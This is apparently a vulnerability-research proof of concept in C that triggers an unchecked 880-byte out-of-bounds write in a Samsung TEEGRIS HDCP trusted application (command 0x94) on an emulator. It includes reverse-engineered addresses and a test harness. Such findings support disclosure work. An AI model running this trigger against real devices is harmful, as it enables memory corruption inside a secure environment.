/* HDCP cmd 0x94 (TZ_HDCP2_DEC_HK23) — Finding #1, MEDIUM CWE-787 OOB write.
 *
 * Emulator build S921BXXS9BYH20Y0: handler sub_14254, dispatcher sub_9E64,
 * entry TA_InvokeCommandEntryPoint@0xA7C4, gate sub_AA84 (isInitialized).
 *
 * Entry requires param_types low byte 0x77 (params[0],[1] = MEMREF_TEMP_INOUT):
 *   (a3 & 0xF)==7  &&  (a3>>4)==7
 *   params[0] = req  (copied into TEE_Malloc(req_size); req_size in [1,0x10017], handler needs >=0x384)
 *   params[1] = resp (RAW REE shared buffer a4[2]; size a4[3] = resp_size)
 * Gate: sub_AA84(0x94) -> LABEL_10 -> returns 1 UNCONDITIONALLY  => UNGATED.
 * Handler: *resp_size = 880; then sub_1AF04(req+20, 880, resp, resp_size, req+4, 0)
 *   writes 880 bytes (white-box AES-CTR, all-local code) into resp,
 *   WITHOUT ever checking the caller's params[1].size against 880.
 *
 * A/B test of the missing bounds check:
 *   - resp declared 16   (<<880): 864-byte OOB write past the declared buffer
 *   - resp declared 0x370 (=880) : exactly in-bounds
 *   Both must return the SAME code (post-write path) => the handler never
 *   validates resp_size. Expected ret 0xFFFFFF7E (-130): white-box decrypt of
 *   the arbitrary req does not match the 0xCA8901A950620278 'redata' magic,
 *   but the 880-byte write already executed before that memcmp.
 *
 * The OOB cannot fault/trip asan here: REE param buffers are page-mapped via
 * map_anywhere() with NO redzone (asan only instruments the TA heap), and
 * 880 < 0x1000 starting at the page-aligned base => the write lands in page
 * slack. The return value is the proof the unchecked write ran.
 */
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

#define REQ_SZ   0x400          /* >= 0x384 so the handler proceeds */

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337 2>/dev/null");
    system("ipcrm -M 0x13338 2>/dev/null");
    system("ipcrm -M 0x13339 2>/dev/null");
    system("ipcrm -M 0x1333a 2>/dev/null");
#endif
}

static void fire(TEEC_Session *session, uint8_t *req, uint8_t *resp,
                 uint32_t resp_size, const char *label)
{
    TEEC_Operation op;
    uint32_t err_origin = 0;
    memset(&op, 0, sizeof(op));
    /* low byte must be 0x77: both memrefs INOUT */
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_INOUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = req;  op.params[0].tmpref.size = REQ_SZ;
    op.params[1].tmpref.buffer = resp; op.params[1].tmpref.size = resp_size;

    printf("[poc] >>> cmd 0x94  %-18s  req_size=0x%x  resp_size=0x%x (%u)\n",
           label, REQ_SZ, resp_size, resp_size);
    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x94, &op, &err_origin);
    printf("[poc] <<< ret=0x%x (%d)  origin=0x%x  [resp_size written back=0x%x]\n",
           res, (int)res, err_origin, op.params[1].tmpref.size);
}

int main(int argc, char **argv)
{
    char* ta = "00000000-0000-0000-0000-000048444350";
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitContext failed 0x%x\n", res); exit(-1); }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) { printf("OpenSession failed 0x%x\n", res); exit(-1); }
    printf("[poc] session opened\n");

    /* req: 0x400 arbitrary bytes (req+20 = WB-AES input, req+4 = IV) */
    uint8_t *req   = (uint8_t*)allocate_param_mem(&context, REQ_SZ);
    /* two resp buffers backed by full pages, but DECLARED at different sizes */
    uint8_t *respA = (uint8_t*)allocate_param_mem(&context, 0x1000);
    uint8_t *respB = (uint8_t*)allocate_param_mem(&context, 0x1000);
    if (!req || !respA || !respB) { printf("[poc] alloc failed\n"); exit(-1); }
    memset(req,   0x41, REQ_SZ);
    memset(respA, 0x00, 0x1000);
    memset(respB, 0x00, 0x1000);

    /* A: OOB case — declare resp as 16 bytes (handler will still write 880) */
    fire(&session, req, respA, 16,     "OOB(resp=16)");
    /* B: in-bounds control — declare resp as 0x370 = 880 bytes */
    fire(&session, req, respB, 0x370,  "INBOUNDS(resp=880)");

    /* C: write-extent probe — declare resp as a full page, pre-zeroed, then
     * measure how many bytes the handler actually wrote (last non-zero off). */
    memset(respA, 0x00, 0x1000);
    fire(&session, req, respA, 0x1000, "EXTENT(resp=4096)");
    int last = -1;
    for (int i = 0; i < 0x1000; i++) if (respA[i] != 0x00) last = i;
    int nz = 0; for (int i = 0; i < 0x1000; i++) if (respA[i] != 0x00) nz++;
    printf("[poc] write-extent: last non-zero offset = %d (0x%x), non-zero bytes = %d "
           "(handler writes 880=0x370 regardless of declared resp size)\n",
           last, last, nz);

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
